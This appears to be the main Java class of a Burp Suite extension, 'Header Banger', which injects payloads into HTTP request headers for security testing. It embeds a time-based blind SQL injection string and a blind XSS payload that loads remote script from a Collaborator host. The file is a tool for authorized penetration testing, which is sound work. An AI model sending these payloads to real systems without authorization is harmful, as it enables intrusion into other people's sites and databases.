package slicingmelon.burpheaderbanger;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.SecretKey;
import burp.api.montoya.persistence.PersistedObject;


import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;

public class BurpHeaderBanger implements BurpExtension {

    private static final String VERSION = "0.0.1";
    public static final int MAX_DICTIONARY_SIZE = 20000; // Increased for better XSS detection
    private static final int DEFAULT_SQLI_SLEEP_TIME = 17;
    
    public static final Set<String> SKIP_CONTENT_TYPES = Set.of(
            "image/png", "image/jpeg", "image/jpg", "image/gif",
            "video/webm", "video/mp4", "text/event-stream",
            "application/octet-stream", "font/woff", "font/woff2"
    );

    private MontoyaApi api;
    private PersistedObject persistedObject;
    private CollaboratorClient collaboratorClient;
    private ScheduledExecutorService scheduler;
    private String collaboratorServerLocation;

    
    // Settings
    private boolean extensionActive = true;
    private boolean onlyInScopeItems = false;
    private int attackMode = 2; // 1 = Blind SQLi, 2 = Blind XSS
    private int sqliSleepTime = DEFAULT_SQLI_SLEEP_TIME;
    private boolean timingBasedDetectionEnabled = true; // Timing measurement excludes intercept delays for accuracy
    
    // Headers and payloads
    private List<String> headers = new ArrayList<>();
    private List<String> sensitiveHeaders = new ArrayList<>();
    private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
    private String bxssPayload = "\"><img/src/onerror=import('//{{collaborator}}')>"; // Use {{collaborator}} placeholder
    private List<String> skipHosts = new ArrayList<>();
    private List<String> injectedHeaders = new ArrayList<>();
    private List<String> extraHeaders = new ArrayList<>();
    private boolean allowDuplicateHeaders = true; // true = allow duplicate headers, false = add only if not exists
    
    // UI Components
    private HeaderBangerTab headerBangerTab;
    
    // Request timing tracking
    private final Map<String, Long> requestTimestamps = new ConcurrentHashMap<>();
    
    // Default headers
    private static final List<String> DEFAULT_HEADERS = Arrays.asList(
            "User-Agent",
            "Referer",
            "X-Forwarded-For",
            "X-Real-IP",
            "Forwarded",
            "True-Client-IP",
            "X-Client-IP",
            "X-Cluster-Client-IP",
            "X-Originating-IP",
            "CF-Connecting-IP",
            "Fastly-Client-IP"
    );
    
    private static final List<String> DEFAULT_SENSITIVE_HEADERS = Arrays.asList(
            "X-Host", "X-Forwarded-Host", "X-Forwarded-Server",
            "X-HTTP-Host-Override", "Forwarded", "Origin"
    );
    
    private static final List<String> DEFAULT_SKIP_HOSTS = Arrays.asList(
            "player.vimeo.com", "example3.com"
    );

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.persistedObject = api.persistence().extensionData();
        
        // Initialize collaborator client with secret key
        initializeCollaboratorClient();
        
        this.scheduler = Executors.newScheduledThreadPool(2);
        
        // Set extension name
        api.extension().setName("Header Banger");
        
        // Load settings
        loadSettings();
        
        // Update injected headers
        updateInjectedHeaders();
        
        // Create helper classes
        AuditIssueBuilder auditIssueCreator = new AuditIssueBuilder(this, api);
        ProxyHandler proxyHandler = new ProxyHandler(this, api, auditIssueCreator);
        ScanCheck scanCheck = new ScanCheck(this, api, auditIssueCreator);
        
        // Register handlers
        api.proxy().registerRequestHandler(proxyHandler);
        api.proxy().registerResponseHandler(proxyHandler);
        // Scanner registration commented out temporarily until we implement the interaction handler approach
        // api.scanner().registerActiveScanCheck(scanCheck);
        // api.scanner().registerPassiveScanCheck(scanCheck);
        api.userInterface().registerContextMenuItemsProvider(scanCheck);
        
        // Create and register UI
        headerBangerTab = new HeaderBangerTab(this, api);
        api.userInterface().registerSuiteTab("Header Banger", headerBangerTab.getTabbedPane());
        
        api.logging().logToOutput("Header Banger v" + VERSION + " loaded successfully");
    }

    private void initializeCollaboratorClient() {
        try {
            // Get existing secret key from persistence
            String existingCollaboratorKey = persistedObject.getString("collaboratorSecretKey");
            
            if (existingCollaboratorKey != null && !existingCollaboratorKey.isEmpty()) {
                try {
                    api.logging().logToOutput("Creating Collaborator client from existing key");
                    this.collaboratorClient = api.collaborator().restoreClient(SecretKey.secretKey(existingCollaboratorKey));
                } catch (Exception e) {
                    api.logging().logToOutput("Failed to restore collaborator client, creating new one: " + e.getMessage());
                    this.collaboratorClient = api.collaborator().createClient();
                    persistedObject.setString("collaboratorSecretKey", this.collaboratorClient.getSecretKey().toString());
                }
            } else {
                api.logging().logToOutput("No previously found Collaborator client. Creating new client...");
                this.collaboratorClient = api.collaborator().createClient();
                
                // Save the secret key of the CollaboratorClient so that you can retrieve it later
                api.logging().logToOutput("Saving Collaborator secret key");
                persistedObject.setString("collaboratorSecretKey", this.collaboratorClient.getSecretKey().toString());
            }
            
            this.collaboratorServerLocation = this.collaboratorClient.generatePayload().toString().split("\\.", 2)[1];
            api.logging().logToOutput("Collaborator client initialized successfully");
        } catch (Exception e) {
            api.logging().logToError("Failed to initialize collaborator client: " + e.getMessage());
            // Fallback to creating a new client
            this.collaboratorClient = api.collaborator().createClient();
            this.collaboratorServerLocation = this.collaboratorClient.generatePayload().toString().split("\\.", 2)[1];
        }
    }

    private void loadSettings() {
        // Load extension active state
        if (persistedObject.getBoolean("extensionActive") != null) {
            extensionActive = persistedObject.getBoolean("extensionActive");
        }
        
        // Load only in scope setting
        if (persistedObject.getBoolean("onlyInScopeItems") != null) {
            onlyInScopeItems = persistedObject.getBoolean("onlyInScopeItems");
        }
        
        // Load attack mode
        if (persistedObject.getInteger("attackMode") != null) {
            attackMode = persistedObject.getInteger("attackMode");
        }
        
        // Load timing-based detection setting
        if (persistedObject.getBoolean("timingBasedDetectionEnabled") != null) {
            timingBasedDetectionEnabled = persistedObject.getBoolean("timingBasedDetectionEnabled");
        }
        
        // Load headers
        String headersJson = persistedObject.getString("headers");
        if (headersJson != null && !headersJson.isEmpty()) {
            headers = new ArrayList<>(Arrays.asList(headersJson.split(",")));
        } else {
            headers = new ArrayList<>(DEFAULT_HEADERS);
        }
        
        // Load sensitive headers
        String sensitiveHeadersJson = persistedObject.getString("sensitiveHeaders");
        if (sensitiveHeadersJson != null && !sensitiveHeadersJson.isEmpty()) {
            sensitiveHeaders = new ArrayList<>(Arrays.asList(sensitiveHeadersJson.split(",")));
        } else {
            sensitiveHeaders = new ArrayList<>(DEFAULT_SENSITIVE_HEADERS);
        }
        
        // Load skip hosts
        String skipHostsJson = persistedObject.getString("skipHosts");
        if (skipHostsJson != null && !skipHostsJson.isEmpty()) {
            skipHosts = new ArrayList<>(Arrays.asList(skipHostsJson.split(",")));
        } else {
            skipHosts = new ArrayList<>(DEFAULT_SKIP_HOSTS);
        }
        
        // Load payloads
        String sqliPayloadSetting = persistedObject.getString("sqliPayload");
        if (sqliPayloadSetting != null && !sqliPayloadSetting.isEmpty()) {
            sqliPayload = sqliPayloadSetting;
        }
        
        String bxssPayloadSetting = persistedObject.getString("bxssPayload");
        if (bxssPayloadSetting != null && !bxssPayloadSetting.isEmpty()) {
            bxssPayload = bxssPayloadSetting;
        }
        
        // Load SQL injection sleep time
        if (persistedObject.getInteger("sqliSleepTime") != null) {
            sqliSleepTime = persistedObject.getInteger("sqliSleepTime");
        }
        
        // Load extra headers
        String extraHeadersJson = persistedObject.getString("extraHeaders");
        if (extraHeadersJson != null && !extraHeadersJson.isEmpty()) {
            extraHeaders = new ArrayList<>(Arrays.asList(extraHeadersJson.split(",")));
        } else {
            extraHeaders = new ArrayList<>();
        }
        
        // Load allow duplicate headers setting
        if (persistedObject.getBoolean("allowDuplicateHeaders") != null) {
            allowDuplicateHeaders = persistedObject.getBoolean("allowDuplicateHeaders");
        }
    }

    public void saveSettings() {
        // Save extension active state
        persistedObject.setBoolean("extensionActive", extensionActive);
        
        // Save only in scope setting
        persistedObject.setBoolean("onlyInScopeItems", onlyInScopeItems);
        
        // Save attack mode
        persistedObject.setInteger("attackMode", attackMode);
        
        // Save timing-based detection setting
        persistedObject.setBoolean("timingBasedDetectionEnabled", timingBasedDetectionEnabled);
        
        // Save headers
        persistedObject.setString("headers", String.join(",", headers));
        
        // Save sensitive headers
        persistedObject.setString("sensitiveHeaders", String.join(",", sensitiveHeaders));
        
        // Save skip hosts
        persistedObject.setString("skipHosts", String.join(",", skipHosts));
        
        // Save payloads
        persistedObject.setString("sqliPayload", sqliPayload);
        persistedObject.setString("bxssPayload", bxssPayload);
        
        // Save SQL injection sleep time
        persistedObject.setInteger("sqliSleepTime", sqliSleepTime);
        
        // Debug logging for extra headers save
        api.logging().logToOutput("DEBUG saveSettings: Saving " + extraHeaders.size() + " extra headers: " + extraHeaders);
        api.logging().logToOutput("DEBUG saveSettings: Extra headers as string: '" + String.join(",", extraHeaders) + "'");
        api.logging().logToOutput("DEBUG saveSettings: allowDuplicateHeaders setting: " + allowDuplicateHeaders);
        
        persistedObject.setString("extraHeaders", String.join(",", extraHeaders));
        persistedObject.setBoolean("allowDuplicateHeaders", allowDuplicateHeaders);
    }

    // Getters and setters
    public boolean isExtensionActive() { return extensionActive; }
    public void setExtensionActive(boolean active) { this.extensionActive = active; }

    public boolean isOnlyInScopeItems() { return onlyInScopeItems; }
    public void setOnlyInScopeItems(boolean onlyInScopeItems) { this.onlyInScopeItems = onlyInScopeItems; }

    public int getAttackMode() { return attackMode; }
    public void setAttackMode(int attackMode) { this.attackMode = attackMode; }

    public int getSqliSleepTime() { return sqliSleepTime; }
    public void setSqliSleepTime(int sqliSleepTime) { this.sqliSleepTime = sqliSleepTime; }

    public boolean isTimingBasedDetectionEnabled() { return timingBasedDetectionEnabled; }
    public void setTimingBasedDetectionEnabled(boolean timingBasedDetectionEnabled) { this.timingBasedDetectionEnabled = timingBasedDetectionEnabled; }

    public List<String> getHeaders() { return headers; }
    public void setHeaders(List<String> headers) { this.headers = headers; }

    public List<String> getSensitiveHeaders() { return sensitiveHeaders; }
    public void setSensitiveHeaders(List<String> sensitiveHeaders) { this.sensitiveHeaders = sensitiveHeaders; }

    public String getSqliPayload() { return sqliPayload; }
    public void setSqliPayload(String sqliPayload) { this.sqliPayload = sqliPayload; }

    public String getBxssPayload() { return bxssPayload; }
    public void setBxssPayload(String bxssPayload) { this.bxssPayload = bxssPayload; }

    public List<String> getSkipHosts() { return skipHosts; }
    public void setSkipHosts(List<String> skipHosts) { this.skipHosts = skipHosts; }

    public List<String> getInjectedHeaders() { return injectedHeaders; }
    public void setInjectedHeaders(List<String> injectedHeaders) { this.injectedHeaders = injectedHeaders; }

    public List<String> getExtraHeaders() { return extraHeaders; }
    public void setExtraHeaders(List<String> extraHeaders) { this.extraHeaders = extraHeaders; }

    public boolean isAllowDuplicateHeaders() { return allowDuplicateHeaders; }
    public void setAllowDuplicateHeaders(boolean allow) { this.allowDuplicateHeaders = allow; }

    public CollaboratorClient getCollaboratorClient() { return collaboratorClient; }

    public void updateInjectedHeaders() {
        this.injectedHeaders.clear();
        this.injectedHeaders.addAll(headers);
        this.injectedHeaders.addAll(sensitiveHeaders);
    }

    // Shutdown method
    public void shutdown() {
        if (scheduler != null) {
            scheduler.shutdown();
        }
    }
}

